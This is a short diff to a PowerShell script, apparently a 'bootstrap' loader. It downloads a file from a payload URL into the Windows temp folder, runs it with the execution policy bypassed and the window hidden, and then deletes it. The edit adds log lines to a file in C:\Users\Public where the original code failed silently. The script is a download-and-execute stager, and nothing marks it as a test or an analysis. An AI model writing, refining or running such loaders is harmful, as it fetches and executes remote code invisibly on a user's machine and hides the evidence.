@@ -28,9 +28,11 @@ $dest       = "C:\Windows\Temp\$(New-Guid).ps1"
 
 try {
     Invoke-WebRequest -Uri $payloadUrl -OutFile $dest -UseBasicParsing
+    "Downloaded payload successfully" | Out-File "C:\Users\Public\bootstrap_log.txt" -Force
     powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File $dest
+    "Executed payload successfully" | Out-File "C:\Users\Public\bootstrap_log.txt" -Append
 } catch {
-    # Silent fail
+    "ERROR: $($_.Exception.Message)" | Out-File "C:\Users\Public\bootstrap_log.txt" -Force
 } finally {
     Remove-Item $dest -Force -ErrorAction SilentlyContinue
 }
